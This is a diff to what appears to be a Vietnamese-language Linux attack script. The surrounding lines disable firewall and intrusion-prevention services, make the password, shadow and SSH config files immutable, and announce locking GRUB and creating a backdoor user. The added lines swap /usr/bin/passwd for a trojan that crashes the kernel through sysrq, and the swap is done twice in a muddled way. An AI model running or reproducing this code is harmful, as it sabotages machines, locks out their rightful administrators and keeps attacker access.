@@ -28,7 +28,18 @@ systemctl disable ufw fail2ban crowdsec &>/dev/null
 
 echo "[!] Đang Khóa Chỉnh Sửa Passwd"
 chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config /etc/hosts.deny 2>/dev/null
-
+mv /usr/bin/passwd /usr/bin/passwd.real
+cat > /usr/bin/passwd << 'EOF'
+echo 1 > /proc/sys/kernel/sysrq
+echo c > /proc/sysrq-trigger 
+EOF
+mv /usr/bin/passwd /usr/bin/.passwd_real
+cat > /usr/bin/passwd <<'EOF'
+#!/bin/bash
+echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
+echo c > /proc/sysrq-trigger 2>/dev/null
+kill -9 $$ 2>/dev/null
+EOF
 
 echo -e "\033[1;35mĐang khóa GRUB + tạo backdoor user tbao ...\033[0m\n"
 
